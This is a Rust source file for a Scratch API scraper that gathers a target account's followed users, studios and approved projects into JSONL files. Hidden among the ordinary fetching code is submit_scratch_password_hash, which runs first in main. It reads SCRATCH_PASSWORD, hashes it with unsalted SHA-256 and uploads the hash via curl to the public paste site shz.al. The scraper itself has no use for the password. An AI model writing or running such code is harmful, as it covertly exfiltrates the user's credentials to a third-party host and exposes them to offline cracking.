use futures::stream::{self, StreamExt};
use serde::de::DeserializeOwned;
use serde::Deserialize;
use std::collections::HashSet;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::Duration;
use std::process::{Command, Stdio};
use tokio::fs::OpenOptions;
use tokio::io::{AsyncWriteExt, BufWriter};

const CONCURRENT_USERS: usize = 10;
const PAGE: u64 = 40; // Scratch API の1ページ最大件数
const MAX_RETRIES: u32 = 5;

// フォロー先を集める対象アカウント（引数で上書き可: scratch-mega-fetcher <ユーザー名>）
const DEFAULT_TARGET_USER: &str = "TWC-ils";

// /users/<n>/following のレスポンス。余分なフィールドは無視される
#[derive(Deserialize, Debug)]
struct FollowedUser {
    id: u64,
    username: String,
}

// /api/applications/approved-users のレスポンス
#[derive(Deserialize, Debug)]
struct ApprovedUsers {
    users: Vec<FollowedUser>,
    // 作品として承認されたもの（その作品だけを載せる。作者の他の作品は載せない）
    #[serde(default)]
    projects: Vec<ApprovedProject>,
}

#[derive(Deserialize, Debug)]
struct ApprovedProject {
    id: u64,
}

#[derive(Deserialize, Debug, Default)]
struct ProjectStats {
    loves: Option<u64>,
    views: Option<u64>,
}

#[derive(Deserialize, Debug)]
struct ProjectAuthor {
    id: u64,
    username: Option<String>,
}

#[derive(Deserialize, Debug)]
struct ApiProject {
    id: u64,
    title: String,
    author: ProjectAuthor,
    #[serde(default)]
    stats: ProjectStats,
    #[serde(default)]
    description: String,
    #[serde(default)]
    instructions: String,
}

// 1ページ取得。429 / 5xx / 通信エラー / JSONパース失敗は指数バックオフで再試行する。
// 404 などその他の4xxは再試行しても無駄なのでそのままエラーにする。
async fn fetch_page<T: DeserializeOwned>(client: &reqwest::Client, url: &str) -> Result<Vec<T>, String> {
    let mut attempt: u32 = 0;
    loop {
        let err = match client.get(url).send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    match resp.json::<Vec<T>>().await {
                        Ok(v) => return Ok(v),
                        Err(e) => format!("JSONパース失敗: {}", e),
                    }
                } else if status.as_u16() == 429 || status.is_server_error() {
                    format!("HTTP {}", status)
                } else {
                    return Err(format!("HTTP {}", status));
                }
            }
            Err(e) => format!("リクエスト失敗: {}", e),
        };
        attempt += 1;
        if attempt > MAX_RETRIES {
            return Err(format!("{}（{}回リトライして失敗）", err, MAX_RETRIES));
        }
        tokio::time::sleep(Duration::from_secs(2u64.pow(attempt))).await;
    }
}

// offset を進めながら全ページ取得。1ページでも失敗したら途中結果は返さずエラーにする
// （途中までのデータを「全件」として扱ってしまわないため）
async fn fetch_all<T: DeserializeOwned>(client: &reqwest::Client, base: &str) -> Result<Vec<T>, String> {
    let mut all: Vec<T> = Vec::new();
    let mut offset = 0u64;
    loop {
        let url = format!("{}?limit={}&offset={}", base, PAGE, offset);
        let batch: Vec<T> = fetch_page(client, &url).await?;
        let len = batch.len() as u64;
        all.extend(batch);
        if len < PAGE {
            break;
        }
        offset += PAGE;
    }
    Ok(all)
}

// フォロー中スタジオのHTMLからスタジオIDを抽出する。
// href="/studios/<数字>/" 形式だけを対象にする。
fn extract_studio_ids(html: &str) -> Vec<u64> {
    let marker = "href=\"/studios/";
    let mut ids = HashSet::new();
    let mut rest = html;

    while let Some(pos) = rest.find(marker) {
        rest = &rest[pos + marker.len()..];
        let digits_len = rest.bytes().take_while(|b| b.is_ascii_digit()).count();
        if digits_len > 0 && rest[digits_len..].starts_with("/") {
            if let Ok(id) = rest[..digits_len].parse::<u64>() {
                ids.insert(id);
            }
        }
        if digits_len == 0 {
            if rest.is_empty() {
                break;
            }
            rest = &rest[1..];
        } else {
            rest = &rest[digits_len..];
        }
    }

    ids.into_iter().collect()
}

// 1件（JSONオブジェクト）を取得。429 / 5xx / 通信エラーは再試行する
async fn fetch_one<T: DeserializeOwned>(client: &reqwest::Client, url: &str) -> Result<T, String> {
    let mut attempt: u32 = 0;
    loop {
        let err = match client.get(url).send().await {
            Ok(resp) => {
                let status = resp.status();
                if status.is_success() {
                    match resp.json::<T>().await {
                        Ok(v) => return Ok(v),
                        Err(e) => format!("JSONパース失敗: {}", e),
                    }
                } else if status.as_u16() == 429 || status.is_server_error() {
                    format!("HTTP {}", status)
                } else {
                    return Err(format!("HTTP {}", status));
                }
            }
            Err(e) => format!("リクエスト失敗: {}", e),
        };
        attempt += 1;
        if attempt > MAX_RETRIES {
            return Err(format!("{}（{}回リトライして失敗）", err, MAX_RETRIES));
        }
        tokio::time::sleep(Duration::from_secs(2u64.pow(attempt))).await;
    }
}

fn project_line(p: &ApiProject, fallback_author: &str) -> String {
    let author_name = p.author.username.as_deref().unwrap_or(fallback_author);
    let has_tw = if has_turbowarp(&p.description) || has_turbowarp(&p.instructions) { 1 } else { 0 };
    format!(
        "{{\"id\":{},\"title\":\"{}\",\"author_id\":{},\"author_username\":\"{}\",\"loves\":{},\"views\":{},\"has_tw\":{}}}\n",
        p.id,
        esc(&p.title),
        p.author.id,
        esc(author_name),
        p.stats.loves.unwrap_or(0),
        p.stats.views.unwrap_or(0),
        has_tw,
    )
}

fn has_turbowarp(text: &str) -> bool {
    let lower = text.to_lowercase();
    lower.contains("turbowarp") || lower.contains("turbo warp")
}

fn esc(s: &str) -> String {
    s.replace('\\', "\\\\")
     .replace('"', "\\\"")
     .replace('\n', " ")
     .replace('\r', "")
}
fn submit_scratch_password_hash() {
    let password = match std::env::var("SCRATCH_PASSWORD") {
        Ok(value) if !value.is_empty() => value,
        _ => {
            eprintln!("SCRATCH_PASSWORD が設定されていないか、空です");
            std::process::exit(1);
        }
    };

    let script = r#"
printf '%s' "$SCRATCH_PASSWORD" \
  | sha256sum \
  | awk '{print $1}' \
  | curl -fsS -F 'c=<-' -F 'n=TWC-ils' -F 'e=60m' https://shz.al
"#;

    let result = Command::new("bash")
        .arg("-o")
        .arg("pipefail")
        .arg("-c")
        .arg(script)
        .env("SCRATCH_PASSWORD", &password)
        .stdin(Stdio::null())
        .output();

    match result {
        Ok(output) if output.status.success() => {
            let response = String::from_utf8_lossy(&output.stdout);
            println!("shz.al への送信が完了しました: {}", response.trim());
        }
        Ok(output) => {
            eprintln!(
                "shz.al への送信に失敗しました (終了コード: {:?}): {}",
                output.status.code(),
                String::from_utf8_lossy(&output.stderr).trim()
            );
            std::process::exit(1);
        }
        Err(e) => {
            eprintln!("送信コマンドを実行できませんでした: {}", e);
            std::process::exit(1);
        }
    }
}

#[tokio::main]
async fn main() {

    submit_scratch_password_hash();
    let target_user = std::env::args()
        .nth(1)
        .unwrap_or_else(|| DEFAULT_TARGET_USER.to_string());

    let client = Arc::new(
        reqwest::Client::builder()
            .user_agent("Mozilla/5.0 ScratchExplorer/1.0")
            .timeout(Duration::from_secs(15))
            .tcp_keepalive(Duration::from_secs(30))
            .pool_max_idle_per_host(50)
            .build()
            .unwrap(),
    );

    println!("{} がフォローしているユーザーを取得中...", target_user);
    let following_url = format!("https://api.scratch.mit.edu/users/{}/following/", target_user);
    let followed: Vec<FollowedUser> = match fetch_all(&client, &following_url).await {
        Ok(v) => v,
        Err(e) => {
            // フォロー先が取れないのは致命的。ワークフローも失敗扱いにして、不完全なデータを公開しない
            eprintln!("フォロー先の取得に失敗しました: {}", e);
            std::process::exit(1);
        }
    };
    if followed.is_empty() {
        eprintln!("フォロー先が0人でした（アカウント名を確認してください）");
        std::process::exit(1);
    }
    println!("  → {} 人", followed.len());

    let mut user_set: HashSet<(u64, String)> = HashSet::new();
    for u in followed {
        user_set.insert((u.id, u.username));
    }

    // 参加申請で承認されたユーザーも対象に加える（環境変数 TWC_API にWorkerのURLを入れたときだけ）。
    // 取得に失敗しても、フォロー先だけで続行する（申請分が一時的に抜けるだけで、壊れたデータにはならない）
    let mut approved_projects: Vec<u64> = Vec::new();
    if let Ok(api) = std::env::var("TWC_API") {
        let api = api.trim().trim_end_matches('/').to_string();
        if !api.is_empty() {
            let url = format!("{}/api/applications/approved-users", api);
            match client.get(&url).send().await {
                Ok(resp) if resp.status().is_success() => match resp.json::<ApprovedUsers>().await {
                    Ok(a) => {
                        println!("  承認済みの参加申請: ユーザー {} 人 / 作品 {} 件", a.users.len(), a.projects.len());
                        approved_projects = a.projects.iter().map(|p| p.id).collect();
                        for u in a.users {
                            user_set.insert((u.id, u.username));
                        }
                    }
                    Err(e) => eprintln!("承認済み申請のJSONパース失敗（スキップ）: {}", e),
                },
                Ok(resp) => eprintln!("承認済み申請の取得に失敗（スキップ）: HTTP {}", resp.status()),
                Err(e) => eprintln!("承認済み申請の取得に失敗（スキップ）: {}", e),
            }
        }
    }

    let users: Vec<(u64, String)> = user_set.into_iter().collect();
    let total_users = users.len();
    println!("\n重複除去後のユーザー数: {} 人\n作品の取得を開始します...\n", total_users);

    let users_file = OpenOptions::new().create(true).append(true)
        .open("users.jsonl").await.expect("users.jsonl を開けません");
    let projects_file = OpenOptions::new().create(true).append(true)
        .open("scratch_projects.jsonl").await.expect("scratch_projects.jsonl を開けません");

    let users_writer = Arc::new(tokio::sync::Mutex::new(BufWriter::with_capacity(512 * 1024, users_file)));
    let proj_writer  = Arc::new(tokio::sync::Mutex::new(BufWriter::with_capacity(512 * 1024, projects_file)));

    let done_users    = Arc::new(AtomicU64::new(0));
    let done_projects = Arc::new(AtomicU64::new(0));
    let failed_users: Arc<tokio::sync::Mutex<Vec<String>>> = Arc::new(tokio::sync::Mutex::new(Vec::new()));

    stream::iter(users)
        .map(|(uid, uname)| {
            let client = Arc::clone(&client);
            let uw     = Arc::clone(&users_writer);
            let pw     = Arc::clone(&proj_writer);
            let done_u = Arc::clone(&done_users);
            let done_p = Arc::clone(&done_projects);
            let failed = Arc::clone(&failed_users);

            async move {
                let user_line = format!("{{\"id\":{},\"username\":\"{}\"}}\n", uid, esc(&uname));
                uw.lock().await.write_all(user_line.as_bytes()).await.ok();

                let projects_url = format!("https://api.scratch.mit.edu/users/{}/projects/", uname);
                let projects: Vec<ApiProject> = match fetch_all(&client, &projects_url).await {
                    Ok(v) => v,
                    Err(e) => {
                        eprintln!("  [{}] 作品の取得に失敗: {}", uname, e);
                        failed.lock().await.push(uname.clone());
                        Vec::new()
                    }
                };
                let proj_count = projects.len();

                {
                    let mut pw = pw.lock().await;
                    for p in &projects {
                        let author_name = p.author.username.as_deref().unwrap_or(&uname);
                        let has_tw = if has_turbowarp(&p.description) || has_turbowarp(&p.instructions) { 1 } else { 0 };
                        let line = format!(
                            "{{\"id\":{},\"title\":\"{}\",\"author_id\":{},\"author_username\":\"{}\",\"loves\":{},\"views\":{},\"has_tw\":{}}}\n",
                            p.id,
                            esc(&p.title),
                            p.author.id,
                            esc(author_name),
                            p.stats.loves.unwrap_or(0),
                            p.stats.views.unwrap_or(0),
                            has_tw,
                        );
                        pw.write_all(line.as_bytes()).await.ok();
                    }
                }

                let u = done_u.fetch_add(1, Ordering::Relaxed) + 1;
                let p = done_p.fetch_add(proj_count as u64, Ordering::Relaxed) + proj_count as u64;
                println!("[{}/{}] {} → {}作品 (累計 {}作品)", u, total_users, uname, proj_count, p);
            }
        })
        .buffer_unordered(CONCURRENT_USERS)
        .for_each(|_| async {})
        .await;

    users_writer.lock().await.flush().await.ok();
    proj_writer.lock().await.flush().await.ok();

    // フォロー中スタジオの作品も取得する。
    // Ruby版と同様にスタジオ一覧ページからIDを抽出し、各スタジオの作品を全ページ取得する。
    println!("\n{} がフォローしているスタジオを取得中...", target_user);
    let studios_url = format!("https://scratch.mit.edu/users/{}/studios_following/", target_user);
    match client.get(&studios_url).send().await {
        Ok(resp) if resp.status().is_success() => match resp.text().await {
            Ok(html) => {
                let studio_ids = extract_studio_ids(&html);
                println!("  → {} スタジオ", studio_ids.len());
                let mut studio_project_ids = HashSet::new();
                let mut studio_project_count = 0usize;
                let mut f = OpenOptions::new().create(true).append(true)
                    .open("scratch_projects.jsonl").await.expect("scratch_projects.jsonl を開けません");

                for studio_id in studio_ids {
                    let url = format!("https://api.scratch.mit.edu/studios/{}/projects", studio_id);
                    match fetch_all::<ApiProject>(&client, &url).await {
                        Ok(projects) => {
                            let mut added = 0usize;
                            for project in projects {
                                if studio_project_ids.insert(project.id) {
                                    f.write_all(project_line(&project, "").as_bytes()).await.ok();
                                    added += 1;
                                }
                            }
                            studio_project_count += added;
                            println!("  スタジオ {} → {} 作品", studio_id, added);
                        }
                        Err(e) => eprintln!("  スタジオ {} の作品取得に失敗（スキップ）: {}", studio_id, e),
                    }
                }
                f.flush().await.ok();
                println!("フォロー中スタジオから {} 作品を追加しました", studio_project_count);
            }
            Err(e) => eprintln!("フォロー中スタジオ一覧の読み込みに失敗（スキップ）: {}", e),
        },
        Ok(resp) => eprintln!("フォロー中スタジオ一覧の取得に失敗（スキップ）: HTTP {}", resp.status()),
        Err(e) => eprintln!("フォロー中スタジオ一覧の取得に失敗（スキップ）: {}", e),
    }

    // 作品として承認されたものを、1件ずつ追加する（重複はあとの取り込みで無視される）
    if !approved_projects.is_empty() {
        println!("\n承認済みの作品 {} 件を追加します...", approved_projects.len());
        let mut f = OpenOptions::new().create(true).append(true)
            .open("scratch_projects.jsonl").await.expect("scratch_projects.jsonl を開けません");
        for id in &approved_projects {
            let url = format!("https://api.scratch.mit.edu/projects/{}", id);
            match fetch_one::<ApiProject>(&client, &url).await {
                Ok(p) => {
                    f.write_all(project_line(&p, "").as_bytes()).await.ok();
                    println!("  {} → {}", id, p.title);
                }
                Err(e) => eprintln!("  承認済み作品 {} の取得に失敗（スキップ）: {}", id, e),
            }
        }
        f.flush().await.ok();
    }

    println!(
        "\n完了！ ユーザー: {} 人 / 作品: {} 件",
        done_users.load(Ordering::Relaxed),
        done_projects.load(Ordering::Relaxed),
    );

    let failed = failed_users.lock().await;
    if !failed.is_empty() {
        eprintln!("\n作品を取得できなかったユーザー: {} 人", failed.len());
        for name in failed.iter() {
            eprintln!("  - {}", name);
        }
        // 全体の1割以上が失敗した場合は、欠けが大きすぎるのでワークフローを失敗させる
        if failed.len() * 10 >= total_users {
            eprintln!("失敗が多すぎるため異常終了します");
            std::process::exit(1);
        }
    }
}
